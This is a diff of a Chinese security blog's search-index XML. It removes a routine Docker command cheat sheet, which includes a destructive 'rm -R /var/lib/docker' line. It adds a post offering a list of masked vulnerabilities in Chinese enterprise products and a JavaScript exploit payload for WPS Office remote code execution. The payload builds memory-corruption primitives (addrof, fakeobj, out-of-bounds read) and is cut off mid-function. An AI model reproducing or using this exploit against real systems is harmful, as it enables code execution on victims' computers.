@@ -322,67 +322,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Docker使用参考</title>
-    <url>/2022/11/26/docker1/</url>
-    <content><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>你好啊 </p>
-</div>
-
-<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>吃了么,睡了么</p>
-</div>
-
-<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>有拥抱么，有晚安么</p>
-</div>
-
-<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
-</div>
-
-<h1 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h1><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p>
-</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-26</p>
-</div></div><div class='timeline-item-content'><h6 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h6><p>官网：<a href="https://www.docker.com/">https://www.docker.com/</a></p>
-<p>描述: Docker 是一个用于开发、交付和运行应用程序的开放平台。 Docker 使您能够将应用程序与基础架构分开，以便 您可以快速交付软件。使用 Docker，您可以管理您的基础架构 以与管理应用程序相同的方式。通过利用 Docker 的 快速传送、测试和部署代码的方法，您可以 显著减少编写代码和在生产环境中运行代码之间的延迟。</p>
-</div></div></div>
-
-
-<h1 id="基础教程"><a href="#基础教程" class="headerlink" title="基础教程"></a>基础教程</h1><div class="timeline red"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p>
-</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-26</p>
-</div></div><div class='timeline-item-content'><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps	列出正在运行的容器</span><br><span class="line">docker ps -a	列出所有容器</span><br><span class="line">docker ps -s	列出正在运行的容器 (带 CPU / 内存)</span><br><span class="line">docker images	列出所有镜像</span><br><span class="line">docker exec -it &lt;container&gt;  bash	连接到容器</span><br><span class="line">docker logs &lt;container&gt;	显示容器的控制台日志</span><br><span class="line">docker stop &lt;container&gt;	停止容器</span><br><span class="line">docker restart &lt;container&gt;	重启一个容器</span><br><span class="line">docker rm &lt;container&gt;	移除一个容器</span><br><span class="line">docker port &lt;container&gt;	显示容器的端口映射</span><br><span class="line">docker top &lt;container&gt;	列出进程</span><br><span class="line">docker kill &lt;container&gt;	杀死一个容器</span><br><span class="line"></span><br><span class="line">docker start nginx-server	开始</span><br><span class="line">docker stop nginx-server	停止</span><br><span class="line">docker restart nginx-server	重启</span><br><span class="line">docker pause nginx-server	暂停</span><br><span class="line">docker unpause nginx-server	取消暂停</span><br><span class="line">docker wait nginx-server	阻塞容器</span><br><span class="line">docker kill nginx-server	发送 SIGKILL</span><br><span class="line">docker attach nginx-server	连接到现有容器</span><br><span class="line">docker pull 镜像   从docker registry中拉取镜像</span><br><span class="line"></span><br><span class="line">docker ps	列出正在运行的容器</span><br><span class="line">docker ps -a	列出所有容器</span><br><span class="line">docker logs nginx-server	容器日志</span><br><span class="line">docker inspect nginx-server	检查容器</span><br><span class="line">docker events nginx-server	容器事件</span><br><span class="line">docker port nginx-server	公共端口</span><br><span class="line">docker top nginx-server	运行进程</span><br><span class="line">docker stats nginx-server	容器资源使用</span><br><span class="line">docker diff nginx-server	列出对容器所做的更改</span><br><span class="line"></span><br><span class="line">docker images	列出镜像</span><br><span class="line">docker rmi nginx	删除镜像</span><br><span class="line">docker load &lt; ubuntu.tar.gz	加载一个 tarred 存储库</span><br><span class="line">docker load --input ubuntu.tar	加载一个 tarred 存储库</span><br><span class="line">docker save busybox &gt; ubuntu.tar	将镜像保存到 tar 存档</span><br><span class="line">docker history	显示镜像的历史</span><br><span class="line">docker commit nginx	将容器另存为镜像。</span><br><span class="line">docker tag nginx eon01/nginx	标记镜像</span><br><span class="line">docker push eon01/nginx	推送镜像</span><br><span class="line"></span><br><span class="line">docker run -d -p 80:80 docker/imagesname  -d后台允许，-p端口映射</span><br><span class="line">docker run -it ubuntu /bin/bash   -i交互式  -t终端</span><br><span class="line"></span><br><span class="line">docker exec id   shell command  容器执行命令</span><br><span class="line">docker exec -u root -it imagesname  /bin/bash</span><br><span class="line">docker exec -it 容器名称 sh  从正在运行的容器中打开一个shell </span><br><span class="line"></span><br><span class="line">docker ps -a 列出所有docker容器（包括停止的）</span><br><span class="line">docker start | stop 容器名称 启动或停止现有容器</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">下载dockerfile，json文件</span><br><span class="line">docker build -t setname    编译镜像，设置名为setname</span><br><span class="line"></span><br><span class="line">更新源代码，重新编译，运行，删除旧容器才可以适用新容器</span><br><span class="line"></span><br><span class="line">删除容器</span><br><span class="line">docker ps 列出获取容器id</span><br><span class="line">docker stop id   停止容器</span><br><span class="line">docker rm id  停止容器后删除容器</span><br><span class="line">docker rm -f id 停止并且删除</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">docker ps -a  列出所有容器</span><br><span class="line">docker kill id 杀死运行中的容器</span><br><span class="line">docker images 列出docker镜像</span><br><span class="line">docker rmi id 删除镜像</span><br><span class="line">docker system prune  删除与容器无关镜像，容器，卷，网络</span><br><span class="line">docker system prune -a 删除任何停止的容器和所有未使用的图像（不仅仅是悬空的图像）</span><br><span class="line">rm -R /var/lib/docker   删除docker数据目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker容器移除后数据不会保存（持久化数据设置）</span><br><span class="line">docker volume create todo-db 创建数据库</span><br><span class="line">设置镜像不能运行，删除后开始设置</span><br><span class="line">docker run -dp 80:80 -v todo-db:/etc/todos images-name  运行时指定卷安装</span><br><span class="line">删除后启动，数据不会清除，</span><br><span class="line">docker volume inspect todo-db 查看卷信息，数据位置信息</span><br><span class="line"></span><br><span class="line">适用绑定挂载（持久化数据，可以控制确切挂载点，实时修改）</span><br><span class="line">docker run -dp 3000:3000 \</span><br><span class="line">     -w /app -v &quot;$(pwd):/app&quot; \</span><br><span class="line">     node:12-alpine \</span><br><span class="line">-w 指定工作目录</span><br><span class="line">-v 将容器种主机当前目录挂载到工作目录</span><br><span class="line"></span><br><span class="line">docker logs -f 容器名称     获取并查看容器日志</span><br></pre></td></tr></table></figure>
-
-</div></div></div>
-
-<div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p>
-</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-26</p>
-</div></div><div class='timeline-item-content'><h6 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h6><p><a href="https://docs.docker.com/get-started/overview/">https://docs.docker.com/get-started/overview/</a><br><a href="https://quickref.cn/docs/docker.html">https://quickref.cn/docs/docker.html</a></p>
-</div></div></div>
-
-
-
-
-<h1 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h1><h2 id="积极向上"><a href="#积极向上" class="headerlink" title="积极向上"></a>积极向上</h2><h2 id="热爱生活"><a href="#热爱生活" class="headerlink" title="热爱生活"></a>热爱生活</h2><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈 </p>
-</div>
-
-<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
-</div>
-
-<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
-</div>
-
-<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
-</div>
-
-
-]]></content>
-      <categories>
-        <category>tool</category>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>all</tag>
-        <tag>docker</tag>
-        <tag>tool</tag>
-        <tag>skill</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Vulnhub靶场CHRONOS-1</title>
     <url>/2022/11/17/bc6/</url>
     <content><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>你好啊 </p>
@@ -465,6 +404,216 @@
         <tag>web</tag>
         <tag>all</tag>
         <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HVV-2023-wps-rce</title>
+    <url>/2023/08/20/hvv2023wps-rce/</url>
+    <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>奇奇怪怪</p>
+</div>
+
+<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
+</div>
+
+<div class="note blue icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p>新的一天开始了</p>
+</div>
+
+<div class="note purple icon-padding disabled"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
+</div>
+
+<div class="timeline pink"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
+</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>08-20</p>
+</div></div><div class='timeline-item-content'><p>永远新的开始啊</p>
+<h1 id="2023-HVV-0day-x2F-Nday-x2F-POC-x2F-EXP-一键鈤卫星系列之-WPS-代码执行-威胁情报"><a href="#2023-HVV-0day-x2F-Nday-x2F-POC-x2F-EXP-一键鈤卫星系列之-WPS-代码执行-威胁情报" class="headerlink" title="2023 HVV 0day &#x2F; Nday &#x2F; POC &#x2F; EXP  一键鈤卫星系列之 WPS 代码执行-威胁情报"></a><strong>2023 HVV 0day &#x2F; Nday &#x2F; POC &#x2F; EXP  一键鈤卫星系列之</strong> WPS 代码执行-威胁情报</h1><h1 id="漏洞情报列表"><a href="#漏洞情报列表" class="headerlink" title="漏洞情报列表"></a>漏洞情报列表</h1><ul>
+<li>安**御运维审计与风险控制系统堡垒机任意用户注册</li>
+<li>致*oa 任意文件上传</li>
+<li>致*oa rce</li>
+<li>用*移动管理系统 uploadApk.d</li>
+<li>用*时空KSOA PayBill SQL注入漏洞</li>
+<li>网* SecSSL 3600安全接入网关系统 任意密码修改漏洞</li>
+<li>网* SecGate 3600 防火墙 obj_app_upfile接口存在任意文件上传漏洞</li>
+<li>通*oaCVE-2023-4166</li>
+<li>通*oa_sql注入</li>
+<li>天*网关前台SQL注入</li>
+<li>深*服应用交付系统命令执行漏洞</li>
+<li>深*服报表</li>
+<li>绿*sas安全审计系统任意文件读取漏洞</li>
+<li>绿* SAS堡垒机 local_user.php 任意用户登录漏洞</li>
+<li>绿* SAS堡垒机 Exec 远程命令执行漏洞</li>
+<li>蓝*-OA-RCE</li>
+<li>金*OA C6-GetSqlData.aspx SQL注入漏洞 POC</li>
+<li>汉*SRM tomcat.jsp 登录绕过漏洞</li>
+<li>海**视前台上传</li>
+<li>广*达oa 后台文件上传漏洞</li>
+<li>绿* NF 下一代防火墙 任意文件上传漏洞</li>
+<li>HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞</li>
+<li>HiKVISION 综合安防管理平台 env 信息泄漏漏洞</li>
+<li>禅* 16.5 router.class.php SQL注入漏洞</li>
+<li>网* SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞</li>
+<li>金*OA 未授权</li>
+<li>宏*OA文件上传</li>
+<li>用*畅捷通 T注入</li>
+<li>用*时空 KSOA servletimagefield 文件 sKeyvalue 参数SQL 注入</li>
+<li>用*时空 KSOATaskRequestServlet sql注入漏洞</li>
+<li>宏* HCM codesettree SQL 注入漏洞</li>
+<li>泛* ShowDocsImagesql注入漏洞</li>
+<li>3<em>0 新天</em>终端安全管理系统信息泄露漏洞</li>
+<li>企业微*（私有化版本）敏感信息泄露漏洞</li>
+<li>华*动力oa SQL注入</li>
+<li>用*文件服务器认证绕过</li>
+<li>广联&amp; Linkworks GetIMDictionarySQL 注入漏洞</li>
+<li>网* ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞</li>
+<li>Panel loadfile 后台文件读取漏洞</li>
+<li>金* 微信管理平台 getsysteminfo 未授权访问漏洞</li>
+<li>PigCMS action_flashUpload 任意文件上传漏洞</li>
+<li>Coremail 邮件系统未授权访问获取管理员账密</li>
+<li>Milesight VPN server.js 任意文件读取漏洞</li>
+<li>红* oa 注入</li>
+<li>nginx配置错误导致的路径穿越风险</li>
+<li>用*GRP-U8存在信息泄露</li>
+<li>启**辰-4A 统一安全管控平台 getMater 信息泄漏</li>
+<li>广*达oa sql注入漏洞</li>
+<li>泛*oa代码执行</li>
+<li>泛*E-Office9文件上传漏洞</li>
+<li>泛* Weaver E-Office9 前台文件包含</li>
+<li>泛* E-Cology 某版本 SQL注入漏洞 POC</li>
+<li>大*智慧园区综合管理平台 文件上传漏洞</li>
+<li>大*智慧园区综合管理平台 searchJson SQL注入漏洞</li>
+<li>大*智慧园区任意密码读取攻击</li>
+<li>辰*景云终端安全管理系统 login SQL注入漏洞</li>
+<li>x捷 xBR 路由器 任意文件上传漏洞</li>
+<li>wps 代码执行</li>
+<li>Openfire身份认证绕过漏洞</li>
+<li>Nacos-Sync</li>
+<li>Eramba任意代码执行漏洞</li>
+<li>绿* NF 下一代防火墙 任意文件上传漏洞</li>
+<li>HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞</li>
+<li>HiKVISION 综合安防管理平台 env 信息泄漏漏洞</li>
+<li>禅* 16.5 router.class.php SQL注入漏洞</li>
+<li>网* SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞</li>
+<li>金*OA 未授权</li>
+<li>宏*OA文件上传</li>
+<li>用*畅捷通 T注入</li>
+<li>用*时空 KSOA servletimagefield 文件 sKeyvalue 参数SQL 注入</li>
+<li>用*时空 KSOATaskRequestServlet sql注入漏洞</li>
+<li>宏* HCM codesettree SQL 注入漏洞</li>
+<li>泛* ShowDocsImagesql注入漏洞</li>
+<li>36* 新天擎终端安全管理系统信息泄露漏洞</li>
+<li>企业微信（私有化版本）敏感信息泄露漏洞</li>
+<li>华天*力oa SQL注入</li>
+<li>用*文件服务器认证绕过</li>
+<li>广*达 Linkworks GetIMDictionarySQL 注入漏洞</li>
+<li>网* ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞</li>
+<li>Panel loadfile 后台文件读取漏洞</li>
+<li>金* 微信管理平台 getsysteminfo 未授权访问漏洞</li>
+<li>PigCMS action_flashUpload 任意文件上传漏洞</li>
+<li>Coremail 邮件系统未授权访问获取管理员账密</li>
+<li>Milesight VPN server.js 任意文件读取漏洞</li>
+<li>红* oa 注入</li>
+<li>nginx配置错误导致的路径穿越风险</li>
+<li>用*GRP-U8存在信息泄露</li>
+<li>启**辰-4A 统一安全管控平台 getMater 信息泄漏</li>
+</ul>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>wps影响范围为：</p>
+<p>WPS Office 2023 个人版 &lt; 11.1.0.15120</p>
+<p>WPS Office 2019 企业版 &lt; 11.8.2.12085</p>
+<p>POC</p>
+<p>在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的）</p>
+<p>127.0.0.1 <a href="http://clientweb.docer.wps.cn.cloudwps.cn/">clientweb.docer.wps.cn.cloudwps.cn</a></p>
+<p><a href="http://漏洞触发需让域名规则满足clientweb.docer.wps.cn/">漏洞触发需让域名规则满足clientweb.docer.wps.cn</a>.{xxxxx}<a href="http://wps.cn/">wps.cn</a> cloudwps.cn和wps.cn没有任何关系</p>
+<p>代码块在底下。（需要原pdf加wechat）</p>
+<h1 id="Pyload"><a href="#Pyload" class="headerlink" title="Pyload:"></a>Pyload:</h1><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> alert === <span class="string">&quot;undefined&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">alert = <span class="variable language_">console</span>.<span class="property">log</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> u32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(f64.<span class="property">buffer</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">v</span>) &#123;</span><br><span class="line"></span><br><span class="line">f64[<span class="number">0</span>] = v;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> u32;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">lo, hi</span>) &#123;</span><br><span class="line"></span><br><span class="line">u32[<span class="number">0</span>] = lo;</span><br><span class="line"></span><br><span class="line">u32[<span class="number">1</span>] = hi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>)&#123; <span class="comment">// major</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100000</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">bug</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">C</span>(<span class="params">z</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Error</span>.<span class="property">prepareStackTrace</span> = <span class="keyword">function</span>(<span class="params">t, B</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> B[z].<span class="title function_">getThis</span>();</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p = <span class="title class_">Error</span>().<span class="property">stack</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Error</span>.<span class="property">prepareStackTrace</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">J</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> optim = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> opt = <span class="keyword">new</span> <span class="title class_">Function</span>(</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;if(typeof a===\&#x27;number\&#x27;)&#123;if(a&gt;2)&#123;for(var</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i=0;i&lt;100;i++);return;&#125;b.d(a,b,1);return&#125;&#x27;</span> +</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;g++;&#x27;</span>.<span class="title function_">repeat</span>(<span class="number">70</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> e = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">J.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">d</span> = <span class="keyword">new</span> <span class="title class_">Function</span>(</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;&quot;use strict&quot;;b.a.call(arguments,b);return arguments[a];&#x27;</span>);</span><br><span class="line"></span><br><span class="line">J.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">a</span> = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a.b(0,a)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">J.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">b</span> = <span class="keyword">new</span> <span class="title class_">Function</span>(</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;b.c();if(a)&#123;&#x27;</span> +</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;g++;&#x27;</span>.<span class="title function_">repeat</span>(<span class="number">70</span>) + <span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">J.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">c</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (optim) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> z = <span class="title function_">C</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="title function_">C</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">z[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">e = &#123;<span class="attr">M</span>: z, <span class="attr">C</span>: p&#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title function_">J</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// jit optim</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bug) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> V = <span class="number">0</span>; <span class="number">1E4</span> &gt; V; V++) &#123;</span><br><span class="line"></span><br><span class="line"><span class="title function_">opt</span>(<span class="number">0</span> == V % <span class="number">4</span> ? <span class="number">1</span> : <span class="number">4</span>, a, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">optim = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">opt</span>(<span class="number">1</span>, a, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> e;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">e1 = <span class="title function_">foo</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">e2 = <span class="title function_">foo</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> e2.<span class="property">M</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hole = e2.<span class="property">C</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"></span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">&#x27;asd&#x27;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">0x8</span>);</span><br><span class="line"></span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line"></span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line"></span><br><span class="line">map.<span class="title function_">delete</span>(<span class="string">&quot;asd&quot;</span>);</span><br><span class="line"></span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x20</span>, <span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr3 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr4 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr5 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> oob_array = [];</span><br><span class="line"></span><br><span class="line">oob_array.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line"></span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">&quot;1&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj_array = &#123;</span><br><span class="line"></span><br><span class="line"><span class="attr">m</span>: <span class="number">1337</span>, <span class="attr">target</span>: gc</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> object_idx = <span class="literal">undefined</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> object_idx_flag = <span class="literal">undefined</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> max_size = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; max_size; i++) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_">d2u</span>(oob_array[i])[<span class="number">0</span>] === <span class="number">0xa72</span>) &#123;</span><br><span class="line"></span><br><span class="line">object_idx = i;</span><br><span class="line"></span><br><span class="line">object_idx_flag = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">if</span> (<span class="title function_">d2u</span>(oob_array[i])[<span class="number">1</span>] === <span class="number">0xa72</span>) &#123;</span><br><span class="line"></span><br><span class="line">object_idx = i + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">object_idx_flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj_para</span>) &#123;</span><br><span class="line"></span><br><span class="line">obj_array.<span class="property">target</span> = obj_para;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> addr = <span class="title function_">d2u</span>(oob_array[object_idx])[object_idx_flag] - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">obj_array.<span class="property">target</span> = gc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> addr;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeobj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> r8 = <span class="title function_">d2u</span>(oob_array[object_idx]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (object_idx_flag === <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">oob_array[object_idx] = <span class="title function_">u2d</span>(addr, r8[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">oob_array[object_idx] = <span class="title function_">u2d</span>(r8[<span class="number">0</span>], addr);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> obj_array.<span class="property">target</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bk_idx = <span class="literal">undefined</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bk_idx_flag = <span class="literal">undefined</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; max_size; i++) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_">d2u</span>(oob_array[i])[<span class="number">0</span>] === <span class="number">1337</span>) &#123;</span><br><span class="line"></span><br><span class="line">bk_idx = i;</span><br><span class="line"></span><br><span class="line">bk_idx_flag = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">if</span> (<span class="title function_">d2u</span>(oob_array[i])[<span class="number">1</span>] === <span class="number">1337</span>) &#123;</span><br><span class="line"></span><br><span class="line">bk_idx = i + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">bk_idx_flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_32</span>(<span class="params">addr</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> r8 = <span class="title function_">d2u</span>(oob_array[bk_idx]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bk_idx_flag === <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">oob_array[bk_idx] = <span class="title function_">u2d</span>(addr, r8[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">oob_array[bk_idx] = <span class="title function_">u2d</span>(r8[<span class="number">0</span>], addr);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> val = dv.<span class="title function_">getUint32</span>(<span 